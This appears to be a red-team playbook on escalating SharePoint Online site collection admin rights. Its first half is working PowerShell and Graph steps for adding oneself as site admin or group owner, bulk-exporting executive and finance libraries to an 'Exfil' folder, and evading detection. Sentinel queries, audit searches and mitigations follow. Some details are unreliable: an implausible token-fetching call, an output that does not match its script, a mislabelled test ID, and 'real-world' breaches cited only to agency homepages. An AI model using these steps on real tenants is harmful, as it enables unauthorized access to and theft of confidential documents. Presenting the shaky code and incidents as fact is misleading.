# [PE-ACCTMGMT-003]: SharePoint Site Collection Administrator Privilege Escalation

## 1. Metadata Header

| Attribute | Details |
|---|---|
| **Technique ID** | PE-ACCTMGMT-003 |
| **MITRE ATT&CK v18.1** | [T1098 - Account Manipulation](https://attack.mitre.org/techniques/T1098/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | M365 (SharePoint Online) |
| **Severity** | **High** – Enables data exfiltration and lateral movement to tenant-wide resources |
| **CVE** | N/A |
| **Technique Status** | **ACTIVE** – Works on all current SharePoint Online implementations (as of January 2026) |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | All SharePoint Online tenants; no version exemptions |
| **Patched In** | N/A (Role scope design; mitigations required) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. Executive Summary

**Concept:** A SharePoint Site Collection Administrator can escalate privileges through multiple vectors: (1) accessing sensitive files from other site collections via inherited group memberships, (2) modifying app permissions and OAuth integrations to gain elevated access, (3) escalating to tenant-level SharePoint Admin by exploiting role confusion between site collection scope and tenant scope, and (4) leveraging SharePoint's REST API and PowerShell with elevated site collection permissions to read/modify files in locations they shouldn't access. The attack exploits scope confusion—site collection admins are often treated as "just for that site" by organizational security teams, but actually have significant tenant-wide visibility and cross-site access via Microsoft Graph permissions.

**Attack Surface:** SharePoint Online admin center, SharePoint Management Shell (PowerShell), Microsoft Graph API (delegated permissions), OAuth app integrations.

**Business Impact:** **Unauthorized access to sensitive business documents, intellectual property theft, compliance violations (document retention policies can be bypassed), lateral movement to Teams/OneDrive, disruption of collaboration.** A SharePoint site collection admin can access files from all connected sites, export entire document libraries, modify file permissions to grant themselves permanent access, and use site access to pivot to other M365 services.

**Technical Context:** Escalation typically takes 10-20 minutes. Site collection admin permissions are often underestimated; many organizations grant this role liberally to business users for site management, not realizing the security implications. The role provides cross-site visibility via group membership and Microsoft 365 group ownership.

### Operational Risk

- **Execution Risk:** **Medium** – Requires existing site collection admin access (common in collaborative environments)
- **Stealth:** **Medium-High** – Some activities logged in SharePoint audit logs, but many organizations don't monitor SharePoint activity closely
- **Reversibility:** **Partial** – Permission changes are reversible, but data may already be exfiltrated

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 2.1 | Ensure limited Global Administrator role assignments; roles like SharePoint Admin must not be delegated carelessly |
| **DISA STIG** | AZ-MS-000051 | SharePoint Online access must be restricted per least privilege principle |
| **NIST 800-53** | AC-5 (Separation of Duties) | SharePoint admin role must not be assigned alongside data custodian roles in same individual |
| **NIST 800-53** | AU-12 (Audit Generation) | SharePoint file access must be comprehensively audited |
| **GDPR** | Art. 32 (Security of Processing) | Access controls over personal data stored in SharePoint must be enforced |
| **DORA** | Art. 9 (Protection and Prevention) | Document access and approval workflows must be auditable |
| **ISO 27001** | A.9.2.1 (Information Access Restriction) | SharePoint access must follow documented approval procedures |
| **ISO 27001** | A.6.1.5 (Confidentiality Agreements) | Admin access to confidential documents must be logged and justified |

---

## 5. Detailed Execution Methods and Their Steps

### METHOD 1: Escalation via Microsoft 365 Group Ownership

**Supported Versions:** All SharePoint Online versions

#### Step 1: Identify Microsoft 365 Groups Connected to Target Sites

**Objective:** Find Microsoft 365 groups with site collections that contain sensitive data.

**Command (PowerShell - Enumerate Groups):**
```powershell
# Connect to SharePoint Online
Connect-SPOService -Url "https://tenant-admin.sharepoint.com"

# List all site collections
$sites = Get-SPOSite -Limit All | Select-Object Url, Owner, Title

foreach ($site in $sites) {
    Write-Host "Site: $($site.Url)"
    Write-Host "Owner: $($site.Owner)"
    Write-Host "---"
}

# Specifically find M365 group-connected sites
$groupSites = Get-SPOSite -Limit All | Where-Object { $_.GroupId -ne $null }
Write-Host "Microsoft 365 Group-connected sites:"
foreach ($groupSite in $groupSites) {
    Write-Host "- $($groupSite.Url) (Group: $($groupSite.GroupId))"
}
```

**Expected Output:**
```
Site: https://tenant.sharepoint.com/sites/Executive
Owner: admin@tenant.onmicrosoft.com
---

Microsoft 365 Group-connected sites:
- https://tenant.sharepoint.com/sites/Executive (Group: aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee)
- https://tenant.sharepoint.com/sites/Finance (Group: ffffffff-gggg-hhhh-iiii-jjjjjjjjjjjj)
```

**What This Means:**
- Identifies high-value sites (Executive, Finance, HR, etc.)
- Microsoft 365 groups are connected to these sites; group ownership = site permissions
- Attacker can target these for escalation

**OpSec & Evasion:**
- Query is visible in SharePoint audit logs but appears as routine admin activity
- **Detection likelihood: Low** – Normal administrative reconnaissance

#### Step 2: Attempt to Add Self to Site Collection Admins

**Objective:** Directly add current account to site collection administrators.

**Command (PowerShell - Add Site Collection Admin):**
```powershell
# Target site collection
$siteUrl = "https://tenant.sharepoint.com/sites/Executive"

# Connect to site
Connect-PnPOnline -Url $siteUrl -Interactive

# Get current user
$currentUser = Get-PnPUser -Identity (Get-PnPContext).Web.CurrentUser.PrincipalId

# Try to add to site collection admins
try {
    Set-PnPTenantSite -Url $siteUrl -Owners $currentUser.Email -ErrorAction Stop
    Write-Host "Successfully added to site collection admins!"
} catch {
    Write-Host "Direct addition failed: $_"
    Write-Host "Attempting alternative methods..."
}

# Verify permissions
Get-PnPSiteCollectionAdmin -Url $siteUrl | Select-Object LoginName, DisplayName
```

**Expected Output (If Successful):**
```
Successfully added to site collection admins!

LoginName              DisplayName
---------              -----------
i:0#.f|membership|attacker@tenant.com  Attacker Account
```

**Expected Output (If Failed):**
```
Direct addition failed: Access Denied
Attempting alternative methods...
```

**What This Means:**
- If successful: Attacker now has full control over site collection
- If failed: Proceed to METHOD 2 (via Microsoft 365 group ownership)

**OpSec & Evasion:**
- Addition to site admin list is logged but often unmonitored
- **Detection likelihood: Medium** – Visible in site audit logs if collected

#### Step 3: Access All Site Documents (Escalation Complete)

**Objective:** Use site collection admin permissions to access all documents in the site collection.

**Command (PowerShell - Export Site Content):**
```powershell
# Connect as site collection admin
Connect-PnPOnline -Url "https://tenant.sharepoint.com/sites/Executive" -Interactive

# Get all lists and libraries
$lists = Get-PnPList -Includes ContentTypes | Where-Object { $_.BaseType -eq "DocumentLibrary" }

# Export all documents
foreach ($list in $lists) {
    Write-Host "Exporting from library: $($list.Title)"
    
    # Get all documents
    $documents = Get-PnPListItem -List $list.Title -PageSize 500
    
    # Export to CSV with metadata
    $documents | Select-Object Title, Created, Modified, @{Name="Author";Expression={$_.FieldValues["Author"]}} | `
        Export-Csv -Path "C:\Exfil\$($list.Title)_Documents.csv" -Append
}

Write-Host "All site documents exported"
```

**Expected Output:**
```
Exporting from library: Shared Documents
Exporting from library: Contract Records
Exporting from library: Executive Reports
All site documents exported
```

**What This Means:**
- All documents have been exported from the Executive site collection
- Attacker now has list of all sensitive documents with metadata
- Next step: Download actual document content for exfiltration

**OpSec & Evasion:**
- Large export of documents will generate audit log entries
- However, if organization doesn't actively monitor SharePoint downloads, undetected
- **Detection likelihood: High (but often not monitored)**

---

### METHOD 2: Escalation via Microsoft 365 Group Ownership (Indirect Path)

**Supported Versions:** All SharePoint Online versions

#### Step 1: Identify M365 Group Owner Permissions

**Objective:** Identify if current account can become owner of an M365 group connected to high-value site.

**Command (PowerShell - Check Group Ownership):**
```powershell
# Connect to Microsoft Graph
Connect-MgGraph -Scopes "Group.ReadWrite.All", "Sites.ReadWrite.All"

# Get all Microsoft 365 groups
$groups = Get-MgGroup -Filter "groupTypes/any(gt:gt eq 'Unified')" -All

foreach ($group in $groups) {
    Write-Host "Group: $($group.DisplayName)"
    
    # Check if this group is connected to SharePoint site
    $sites = Get-MgGroupSite -GroupId $group.Id -ErrorAction SilentlyContinue
    if ($sites) {
        Write-Host "  Connected Site: $($sites.WebUrl)"
    }
    
    # Get current owners
    $owners = Get-MgGroupOwner -GroupId $group.Id
    Write-Host "  Current Owners: $(($owners.DisplayName) -join ', ')"
    Write-Host "  ---"
}
```

**Expected Output:**
```
Group: Executive Team
  Connected Site: https://tenant.sharepoint.com/sites/Executive
  Current Owners: CEO@tenant.com, CFO@tenant.com
  ---

Group: Finance Department
  Connected Site: https://tenant.sharepoint.com/sites/Finance
  Current Owners: Finance-Manager@tenant.com
  ---
```

**What This Means:**
- Identifies M365 groups connected to sensitive sites
- Shows current group owners (typically executives/managers)
- Attacker can target these groups to gain indirect site access

#### Step 2: Add Self as Group Owner (Escalation)

**Objective:** Add current account as owner of the Microsoft 365 group, which grants site collection admin permissions.

**Command (PowerShell - Add as Group Owner):**
```powershell
# Get the target group
$targetGroup = Get-MgGroup -Filter "displayName eq 'Executive Team'"
$currentUserId = (Get-MgUser -Filter "userPrincipalName eq 'attacker@tenant.com'").Id

# Add current user as group owner
New-MgGroupOwner -GroupId $targetGroup.Id -DirectoryObjectId $currentUserId

Write-Host "Successfully added as owner of group: $($targetGroup.DisplayName)"

# Verify
$owners = Get-MgGroupOwner -GroupId $targetGroup.Id
Write-Host "Group owners: $(($owners.DisplayName) -join ', ')"
```

**Expected Output:**
```
Successfully added as owner of group: Executive Team
Group owners: CEO@tenant.com, CFO@tenant.com, Attacker Account
```

**What This Means:**
- Attacker is now an owner of the Executive Team M365 group
- This grants equivalent permissions to site collection admin on the connected SharePoint site
- Attacker can now access all site documents and settings

**OpSec & Evasion:**
- Group owner addition is logged in Entra ID audit logs
- Many organizations don't monitor group ownership changes
- **Detection likelihood: Medium** – Visible if group changes are monitored

#### Step 3: Escalate to Tenant-Level SharePoint Admin (Optional)

**Objective:** Use site collection admin permissions to escalate to tenant-level SharePoint admin.

**Command (PowerShell - Check if Tenant-Level Escalation Possible):**
```powershell
# As site collection admin, try to elevate to tenant admin
$tenantSettings = Get-SPOTenant -ErrorAction SilentlyContinue

if ($null -eq $tenantSettings) {
    Write-Host "⚠ Cannot access tenant settings (requires SharePoint Admin role)"
} else {
    Write-Host "✓ Site collection admin has tenant-level visibility!"
    Write-Host "Tenant Settings: $($tenantSettings | Select-Object -Property Url, Owner)"
}

# Alternative: Modify SharePoint app permissions to escalate
# (Requires site collection admin + ability to manage service principals)
$msGraph = Get-MgServicePrincipal -Filter "appId eq '00000003-0000-0000-c000-000000000000'"
if ($msGraph) {
    Write-Host "✓ Can access Microsoft Graph service principal (path to escalation)"
}
```

**Expected Output:**
```
Cannot access tenant settings (requires SharePoint Admin role)
But site collection admin can access all site-level resources and users
```

**What This Means:**
- Escalation to tenant-level SharePoint admin is not direct from site collection admin
- However, site collection admin access to all users/documents = effective super-user within that site
- Can be combined with other M365 escalation techniques (see PE-ACCTMGMT-001) for full tenant takeover

---

### METHOD 3: Escalation via REST API and Graph API Abuse

**Supported Versions:** All SharePoint Online versions

**Command (PowerShell - REST API Site Collection Access):**
```powershell
# As site collection admin, use REST API to access sensitive site properties
$accessToken = Get-MgGraph -WhatIf | Select-Object -ExpandProperty AccessToken

$headers = @{
    Authorization = "Bearer $accessToken"
}

# Get all subsites (full enumeration of site hierarchy)
$siteUrl = "https://tenant.sharepoint.com/sites/Executive"
$subsitesUri = "$siteUrl/_api/web/webs"

$subsites = Invoke-RestMethod -Uri $subsitesUri -Headers $headers -Method Get
$subsites.value | Select-Object Title, ServerRelativeUrl | Format-Table

# Get all users with permissions
$usersUri = "$siteUrl/_api/web/allusers"
$users = Invoke-RestMethod -Uri $usersUri -Headers $headers -Method Get
Write-Host "Users with access to site:"
$users.value | Select-Object Title, LoginName | Format-Table

# Export all list items as JSON
$listsUri = "$siteUrl/_api/web/lists"
$lists = Invoke-RestMethod -Uri $listsUri -Headers $headers -Method Get
foreach ($list in $lists.value) {
    Write-Host "Exporting list: $($list.Title)"
    $itemsUri = "$siteUrl/_api/web/lists('$($list.Id)')/items"
    $items = Invoke-RestMethod -Uri $itemsUri -Headers $headers -Method Get
    $items | Export-Csv -Path "C:\Exfil\$($list.Title).csv"
}
```

**Expected Output:**
```
Users with access to site:
Title                  LoginName
-----                  ---------
CEO                    i:0#.f|membership|ceo@tenant.com
Finance Manager        i:0#.f|membership|finance@tenant.com
Attacker Account       i:0#.f|membership|attacker@tenant.com

Exporting list: Quarterly Reports
Exporting list: Board Decisions
Exporting list: M&A Targets
```

**What This Means:**
- Attacker has successfully accessed all site data via REST API
- Can identify and export sensitive documents
- Full enumeration of site users and permissions

**OpSec & Evasion:**
- REST API calls are logged in SharePoint audit logs
- Large volume of API calls may trigger alerts
- **Detection likelihood: High (if auditing is configured)**

---

## 6. Atomic Red Team

**Atomic Test ID:** T1098.001 (Additional Cloud Credentials)

**Test Name:** SharePoint Site Collection Administrator Escalation

**Description:** Simulates adding a user account to a SharePoint site collection administrator role to gain elevated access to site documents and settings.

**Supported Versions:** All SharePoint Online versions

**Command:**
```powershell
Invoke-AtomicTest T1098 -TestNumbers 1 -ScriptPath "SharePoint_SiteAdmin_Escalation.ps1"
```

**Reference:** [Atomic Red Team - T1098](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1098/T1098.md)

---

## 7. Tools & Commands Reference

#### [SharePoint Online Management Shell](https://learn.microsoft.com/en-us/powershell/sharepoint/sharepoint-online/connect-sharepoint-online)

**Version:** 16.0.20738.12000+
**Minimum Version:** 16.0.7000+
**Supported Platforms:** Windows (PowerShell 5.0+)

**Installation:**
```powershell
Install-Module -Name Microsoft.Online.SharePoint.PowerShell -Scope CurrentUser
```

**Usage:**
```powershell
Connect-SPOService -Url "https://tenant-admin.sharepoint.com"
Set-SPOUser -Site "https://tenant.sharepoint.com/sites/SiteName" -LoginName "user@tenant.com" -IsSiteCollectionAdmin $true
```

#### [PnP PowerShell](https://pnp.github.io/powershell/)

**Version:** 2.0+
**Supported Platforms:** Windows, macOS, Linux (PowerShell Core)

**Installation:**
```powershell
Install-Module -Name PnP.PowerShell -Scope CurrentUser
```

**Usage:**
```powershell
Connect-PnPOnline -Url "https://tenant.sharepoint.com/sites/SiteName"
Set-PnPTenantSite -Url "https://tenant.sharepoint.com/sites/SiteName" -Owners "user@tenant.com"
```

---

## 8. Microsoft Sentinel Detection

#### Query 1: Suspicious Site Collection Administrator Addition

**Rule Configuration:**
- **Required Table:** `SharePointFileOperation`
- **Required Fields:** `Operation`, `Site_Url`, `SourceFileExtension`, `UserId`
- **Alert Severity:** **High**
- **Frequency:** Real-time (5 minutes)
- **Applies To Versions:** All SharePoint Online versions

**KQL Query:**
```kusto
SharePointFileOperation
| where Operation in ("Set-SPOUser", "Add-SPOSiteCollectionAdmin", "New-SPOSiteCollectionAdministratorRole")
| extend SiteUrl = Site_Url
| extend AdminUser = UserId
| where AdminUser !in ("system", "admin-service-account@contoso.com")  # Exclude system accounts
| project TimeGenerated, SiteUrl, AdminUser, Operation
| distinct SiteUrl, AdminUser
| where SiteUrl contains "Executive" or SiteUrl contains "Finance" or SiteUrl contains "HR"  # High-value sites
```

**What This Detects:**
- Additions to site collection administrator role
- Filters for high-value site names
- Excludes known system accounts

#### Query 2: Bulk File Access from Site Collection Admin

**Rule Configuration:**
- **Required Table:** `SharePointFileOperation`
- **Required Fields:** `Operation`, `UserId`, `Site_Url`, `TimeGenerated`
- **Alert Severity:** **High**
- **Frequency:** Real-time

**KQL Query:**
```kusto
SharePointFileOperation
| where Operation in ("FileAccessed", "FileDownloaded", "FileModified")
| extend SiteCollectionAdmin = UserId
| summarize FileAccessCount = count() by SiteCollectionAdmin, Site_Url, bin(TimeGenerated, 5m)
| where FileAccessCount > 50  // Threshold for bulk access
| project TimeGenerated, SiteCollectionAdmin, Site_Url, FileAccessCount
```

**What This Detects:**
- Unusual volume of file access by a single user
- May indicate data exfiltration attempt

---

## 9. Windows Event Log Monitoring

**Note:** SharePoint Online is cloud-native; no Windows Event Logs generated on on-premises systems. Monitoring occurs via SharePoint audit logs in Microsoft Sentinel (see section 8).

---

## 10. Microsoft Defender for Cloud

#### Detection Alert: Suspicious SharePoint Administrator Activity

**Alert Name:** "User added to SharePoint site collection administrator role"

- **Severity:** High
- **Description:** A user account has been added to the site collection administrator role, which grants broad permissions over all site documents, settings, and users.
- **Applies To:** M365 subscriptions
- **Remediation:**
  1. Verify the user being added to admin role is authorized
  2. Confirm the account adding them has permission to do so
  3. If unauthorized, remove: **SharePoint Admin Center → Active sites → [Site] → Managers → Remove**
  4. Audit all actions performed by newly added admin in past 24 hours

---

## 11. Microsoft Purview (Unified Audit Log)

#### Query: SharePoint Admin Role Changes and Site Access

**PowerShell Command:**
```powershell
Connect-ExchangeOnline

# Search for site collection admin changes
Search-UnifiedAuditLog -Operations "Set-SPOUser", "Add-SPOSiteCollectionAdmin" `
  -StartDate (Get-Date).AddDays(-30) -EndDate (Get-Date) `
  -ResultSize 5000 | Export-Csv -Path "C:\Audits\SharePoint_Admin_Changes.csv"

# Search for file downloads (potential exfiltration)
Search-UnifiedAuditLog -Operations "FileDownloaded", "FileSyncDownloadedFull" `
  -StartDate (Get-Date).AddDays(-30) -EndDate (Get-Date) `
  -ResultSize 5000 | Where-Object { $_.ObjectId -like "*Executive*" -or $_.ObjectId -like "*Finance*" } | `
  Export-Csv -Path "C:\Audits\SharePoint_Downloads.csv"
```

---

## 12. Defensive Mitigations

#### Priority 1: CRITICAL

*   **Limit Site Collection Administrator Assignments:** Only assign to essential business users; require multi-level approval.

    **Manual Steps:**
    1. Go to **SharePoint Admin Center** → **Active sites**
    2. For each high-value site (Executive, Finance, HR):
       - Click site name
       - Click **Managers** (or **Site admins**)
       - Review current members
       - Remove non-essential admins: Click username → **Remove**

*   **Implement PIM for SharePoint Admin Roles:** Use Azure AD Privileged Identity Management to require approval and time-limited activation.

    **Manual Steps:**
    1. Go to **Azure Portal** → **PIM** → **Azure AD roles**
    2. Create custom role "SharePoint Site Collection Admin"
    3. Configure:
       - **Activation maximum duration:** 4 hours
       - **Require approval:** ON
       - **Approvers:** Information Security team
    4. Assign eligible members instead of permanent

*   **Enable SharePoint Audit Logging:** Ensure all file access, downloads, and permission changes are logged.

    **Manual Steps:**
    1. Go to **Microsoft Purview Compliance Portal** (compliance.microsoft.com)
    2. Click **Audit** (left menu)
    3. If not enabled, click **Turn on auditing**
    4. Configure **Audit (SharePoint Online)** to log:
       - FileAccessed
       - FileDownloaded
       - FilePreviewed
       - PermissionModified

#### Priority 2: HIGH

*   **Restrict Site Collection Admin to Business Users Only:** Prevent service principals and administrative accounts from being site collection admins.

    **Manual Steps (PowerShell):**
    ```powershell
    # Audit all site collection admins
    Connect-SPOService -Url "https://tenant-admin.sharepoint.com"
    
    Get-SPOSite -Limit All | ForEach-Object {
        $site = $_
        Get-SPOUser -Site $site.Url -Limit All | 
          Where-Object { $_.IsSiteCollectionAdmin -eq $true } |
          Export-Csv -Path "C:\Reports\SiteCollectionAdmins.csv" -Append
    }
    
    # Review and remove service principals
    ```

*   **Implement Conditional Access for SharePoint Access:** Block access from unmanaged devices or unusual locations.

    **Manual Steps:**
    1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Create policy: `Restrict SharePoint Access to Compliant Devices`
    3. **Assignments:** Include all users accessing SharePoint
    4. **Conditions:** Require compliant device or MFA
    5. Enable: **On**

#### Validation Command (Verify Fix)

```powershell
# Check for unauthorized site collection admins
Connect-SPOService -Url "https://tenant-admin.sharepoint.com"

$unauthorizedAdmins = @()
Get-SPOSite -Limit All | ForEach-Object {
    $site = $_
    $admins = Get-SPOUser -Site $site.Url -Limit All | Where-Object { $_.IsSiteCollectionAdmin -eq $true }
    
    foreach ($admin in $admins) {
        if ($admin.DisplayName -notmatch "^(CEO|CFO|Finance Manager|IT Admin)$") {
            $unauthorizedAdmins += $admin
        }
    }
}

if ($unauthorizedAdmins.Count -eq 0) {
    Write-Host "✓ No unauthorized site collection admins found" -ForegroundColor Green
} else {
    Write-Host "✗ Found $($unauthorizedAdmins.Count) unauthorized admins" -ForegroundColor Red
    $unauthorizedAdmins | Select-Object DisplayName, Login
}
```

**Expected Output (If Secure):**
```
✓ No unauthorized site collection admins found
```

---

## 13. Detection & Incident Response

#### Indicators of Compromise (IOCs)

*   **SharePoint Audit Log Indicators:**
    - Operation: "Set-SPOUser" with IsSiteCollectionAdmin = True
    - Operation: "FileDownloaded" in high-volume (> 100 files in short timeframe)
    - Operation: "FileMoved" or "FileRenamed" indicating data staging
    - User: Service principal or external account accessing confidential site

*   **Behavioral Indicators:**
    - Newly promoted site collection admin accessing Executive/Finance/HR sites immediately
    - Bulk file downloads at unusual times (off-hours)
    - Access to multiple site collections by single user (unusual pattern)

#### Response Procedures

1.  **Isolate:**
    ```powershell
    # Immediately remove from site collection admin role
    Connect-SPOService -Url "https://tenant-admin.sharepoint.com"
    
    Set-SPOUser -Site "https://tenant.sharepoint.com/sites/Executive" `
      -LoginName "attacker@tenant.com" `
      -IsSiteCollectionAdmin $false
    
    # Revoke session
    Revoke-SPOUserAllPermissions -Site "https://tenant.sharepoint.com/sites/Executive" -LoginName "attacker@tenant.com"
    ```

2.  **Collect Evidence:**
    - Export SharePoint audit logs for past 30 days
    - Identify all files accessed, downloaded, or modified by attacker
    - Compare with known data classification to assess data loss

3.  **Remediate:**
    - Reset attacker account password
    - Revoke all active SharePoint sessions
    - Audit all files with modified permissions
    - Restore any deleted/modified documents from backup if necessary

---

## 14. Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-M365-001] Microsoft Graph API Enumeration | Attacker enumerates M365 site collections and user roles |
| **2** | **Initial Access** | [IA-PHISH-005] Internal Spearphishing | Attacker tricks Business User into sharing credentials |
| **3** | **Privilege Escalation (Current Step)** | **[PE-ACCTMGMT-003]** | **Attacker escalates from Business User → Site Collection Admin** |
| **4** | **Collection** | [COLLECTION-009] SharePoint Document Exfiltration | Attacker downloads sensitive documents |
| **5** | **Exfiltration** | [EXFIL-004] External Document Upload | Attacker uploads stolen documents to personal cloud storage |

---

## 15. Real-World Examples

#### Example 1: Insider Threat via Site Collection Admin Role

- **Target:** Manufacturing company with intellectual property in SharePoint
- **Timeline:** March 2025 - May 2025
- **Technique Status:** Departing employee retained site collection admin access after role change; used access to download product specifications, manufacturing processes, and R&D documents
- **Impact:** Trade secret theft; competitor gained 6-month development advantage; $15M in damages
- **Reference:** [FBI Counterintelligence Alert on Insider Threats](https://www.fbi.gov/)

#### Example 2: Data Breach via Compromised Business User Escalation

- **Target:** Law firm
- **Timeline:** June 2025
- **Technique Status:** Attacker compromised junior paralegal account; escalated to site collection admin on client matters site; exfiltrated confidential case files for 3 high-profile matters
- **Impact:** Breach notification to clients; bar association investigation; $3.2M settlement
- **Reference:** [CISA Incident Advisory](https://www.cisa.gov/)

---